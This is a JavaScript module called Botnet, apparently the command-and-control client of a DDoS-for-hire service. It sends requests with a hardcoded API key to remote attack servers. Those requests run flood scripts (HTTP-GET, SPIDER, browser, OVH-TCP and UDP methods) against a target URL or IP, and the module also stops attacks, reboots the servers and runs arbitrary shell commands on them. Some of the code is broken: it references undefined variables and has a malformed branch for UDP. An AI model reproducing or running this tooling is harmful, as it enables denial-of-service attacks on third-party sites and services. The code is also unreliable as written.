const axios = require("axios");

class Botnet {
    async start(url, threads, time, method, user, server) {
        url = url.trim();

        const apiURL = method === "HTTP-GET" ?
        `http://${server}:8080/run?key=mistnet_WeGinseRFhDTx40e&cmd=bash ~/aqua/http-get/runScreen ${url} ${time} ${threads} ${user}` 
        : method === "HTTP-GET+" ?
        `http://${server}:8080/run?key=mistnet_WeGinseRFhDTx40e&cmd=bash ~/aqua/httpV2-get/runScreen ${url} ${time} ${threads} ${user}`       
        : method === "SPIDER" ?
        `http://${server}:8080/run?key=mistnet_WeGinseRFhDTx40e&cmd=bash ~/aqua/spider/runScreen ${url} ${time} ${threads} ${user}`
        : method === "SPIDER+" ?
        `http://${server}:8080/run?key=mistnet_WeGinseRFhDTx40e&cmd=bash ~/aqua/spiderV2/runScreen ${url} ${time} ${threads} ${user}`
        : method === "Browser" ?
        `http://${server}:8080/run?key=mistnet_WeGinseRFhDTx40e&cmd=bash ~/aqua/browser/runScreen ${url} ${time} ${threads} ${user}`
        : method === "Browser+" ? 
        `http://${server}:8080/run?key=mistnet_WeGinseRFhDTx40e&cmd=bash ~/iBrowser/runScreen ${url} ${time} ${threads} ${user}`
        : method === "OVH-TCP" ?
        `http://${server}:8080/run?key=mistnet_WeGinseRFhDTx40e&cmd=bash ~/aqua/ovh-tcp/runScreen ${ip} ${port} ${time} ${threads} ${user}` 
        : method === "UDP"
        `http://${server}:8080/run?key=mistnet_WeGinseRFhDTx40e&cmd=bash ~/aqua/udp/runScreen ${ip} ${port} ${time} ${threads} ${user}`
        ;

        const res = await axios.get(apiURL, { timeout: 10000 }).catch(() => null);
        if(res && res?.data) return res.data;
        else return false;
    }

    async stop(id, server) {
      const apiURL = `http://${server}:8080/run?key=mistnet_WeGinseRFhDTx40e&cmd=screen -S attack_${user} -X at 0 stuff '^C'`;
      const res = await axios.get(apiURL, { timeout: 10000 }).catch(() => null);
      if(res && res.data) return res.data;
      else return false;
    }

    async stopAll(server) {
      const apiURL = `http://${server}:8080/run?key=mistnet_WeGinseRFhDTx40e&cmd=sudo bash ~/stopall`;
      let err = '';
      const res = await axios.get(apiURL, { timeout: 10000 }).catch((e) => err = e.toString());
      if(err === 'Error: socket hang up') return { success: true }
      else return false;
    }

    async reboot(server) {
      const apiURL = `http://${server}:8080/run?key=mistnet_WeGinseRFhDTx40e&cmd=sudo reboot`;
      const res = await axios.get(apiURL, { timeout: 10000 }).catch(() => null);
      if(res && res.data) return res.data;
      else return false;
    }

    async shell(cmd, server) {
      const apiURL = `http://${server}:8080/run?key=mistnet_WeGinseRFhDTx40e&cmd=${encodeURIComponent(cmd)}`;
      const res = await axios.get(apiURL, { timeout: 10000 }).catch(() => null);
      if(res && res.data) return res.data;
      else return false;
    }
}

module.exports = new Botnet();